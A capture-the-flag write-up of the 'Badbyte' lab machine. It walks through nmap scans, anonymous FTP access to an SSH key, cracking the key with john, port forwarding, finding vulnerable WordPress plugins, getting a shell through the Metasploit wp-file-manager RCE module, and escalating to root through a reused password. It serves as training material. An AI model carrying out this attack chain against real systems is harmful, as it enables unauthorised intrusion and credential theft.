##Badbyte

#Enumeration
```
# Nmap 7.91 scan initiated Sat Mar 13 12:47:29 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,30024 10.10.134.177
Nmap scan report for 10.10.134.177
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-03-13 12:47:29 PST for 7s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:89:a3:33:67:85:ac:08:a5:0f:1a:d4:79:78:d2:66 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDef3KhPXzvbcTI+hauosPoKNGQUYV4x0oOCV12uMl/asb0noPbvwbJ+63yuk2hh/uF+4CRbXfp3aY5CujLXgn26KLWVx8laL46+aeXvsUP8wyDMR+ExT4AVlWZTbSM6us8BBMQSNsV99ttdrCjQgSIsbP9I5JQfPjOGJ8AL68P6dhM5XjYmz3JrSwB22EHHULA9JB+Kf23GY7/iXSj99vFyYlzQx3of0avHZAfqzqBpUjuWu2UTzEE8oEBxMYilbLPQUkIfMtTbdafQHi1Lf/87cJikGFlFmSRUSOKfIeZd5AMli1+xMxND1Di/XM2CCDnKcUNjeeheQuFFfN6eisf
|   256 c1:93:e9:26:b8:9b:85:bc:c2:8e:08:a2:a4:85:f6:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ48Mhbg/Dpagxz4sr7EMKCW/yuMRhT31Je3xAzUHzaIxWJkPrnZI8LmS1ay2m+XfabwpgEqqWCP6mYI7H/UG2Q=
|   256 dd:e1:5c:32:d1:fc:a3:c5:4a:0e:bf:c8:c2:79:e4:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIOn/9Bo+nJEIN+3IeO+XZBwU0oPqs9LvCPhCgP1vK6R
30024/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1752 Dec 27 19:55 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Dec 28 16:50 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.13.1.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 13 12:47:36 2021 -- 1 IP address (1 host up) scanned in 7.26 seconds
```

#FTP
FTP is running on port 30024 and we are able to login as anonymous. We login and get the two files on the server. We discover that this is id_rsa private key for the user errorcauser. THe key however needs a passphrawse so we use ssh2john to convert the key and then crack the result with john and the rockyou wordlist. With the passphrase we can get an inital foothold through the ssh as the errorcauser user

#errorcauser port forwarding

We find a note that there is a webserver hosted locally so lets set up port forwarding. We do the following, we have our /etc/proxychains.conf edited to use socks5	127.0.0.1 1337 instead of socks4

Reference https://netsec.ws/?p=278

We do the following first to establish dynamic port forwarding
ssh -i id_rsa -f -N -D 1337 errorcauser@10.10.134.177

We can then scan for what is running locally using the following command
proxychains nmap -sTV -n -PN 127.0.0.1

We find http and mysql running on ports 80,3306 so lets locally forward the remote port 80 through our forwarded port with the following
ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@10.10.134.177

Now we can scan for Service info with the following 
```
# nmap -sC -sV -p 8080 127.0.0.1                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 14:48 PST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000055s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.9.5
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: BadByte &#8211; Just another WordPress site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
```

We then scan for wordpress vulnerabilities with the following
```
# nmap --script=http-wordpress-enum --script-args search-limit=1500 -p 8080 127.0.0.1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 14:34 PST
Stats: 0:04:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:04:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00016s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-wordpress-enum:
| Search limited to top 1500 themes/plugins
|   themes
|     twentyseventeen 1.5
|   plugins
|     akismet
|     duplicator 1.3.26
|_    wp-file-manager 6.0

Nmap done: 1 IP address (1 host up) scanned in 694.53 seconds
```
We then look for vulnerable plugins
```
# searchsploit duplicator 1.3.26
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit | php/webapps/49288.rb
------------------------------------------------------------------------------------- ---------------------------------
```

CVE-2020-11738 shown above has a metasploit module and takes advatange of directory traversal vulnerability


```
# searchsploit wp-filemanager
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin wp-FileManager - 'path' Arbitrary File Download                     | php/webapps/38515.txt
WordPress Plugin wp-FileManager - Arbitrary File Download                            | php/webapps/25440.txt
WordPress Plugin Wp-FileManager 1.2 - Arbitrary File Upload                          | php/webapps/4844.txt
WordPress Plugin Wp-FileManager 6.8 - RCE                                            | php/webapps/49178.bash
------------------------------------------------------------------------------------- ---------------------------------
```
CVE-2020-25213 via WordPress Plugin Wp-FileManager 6.8 - RCE allows for RCE through this vulnerable plugin, and a metasploit module

```
msf6 > search CVE-2020-25213

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution
```
We use the above to get a meterpreter session/shell on the machine as the cth user

#cth privilege escalation
We can find the user flag in /home/cth
we upload linpeas and search for some vulnerabilities

/cdrom
/usr/bin/gettext.sh
```
[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 2675200 Mar 13 23:27 /var/log/apache2/access.log
-rw-r----- 1 root adm 0 Dec 11 16:51 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 58396 Mar 13 22:46 /var/log/apache2/error.log
-rw-r----- 1 root adm 106136 Feb  2 20:05 /var/log/apt/term.log
-rw-r----- 1 root adm 132813 Jan 28 11:36 /var/log/apport.log

[+] Searching passwords in config PHP files
define('DB_PASSWORD', '@n0therp@ssw0rd');
define('DB_PASSWORD', '@n0therp@ssw0rd');
                        case 'DB_PASSWORD' :
        define('DB_PASSWORD', $pwd);
define('DB_PASSWORD', 'password_here');
```
We can't seem to find any leads or it was passed over, but eventually we checkout the .viminfo file in /home/cth and see the following
```
# History of marks within files (newest to oldest):

> /var/log/bash.log
        *       1610977988      0
        "       31      0
        .       31      0
        +       37      0
        +       31      0
        +       37      0
        +       31      0
```
Looking through this bash.log file we are able to see some sudo attempts and a mistyped plaintext password. This password doesnt quite work, but is an example of password reuse and we can modify it slightly to get the new password and then simply get root access with sudo su -

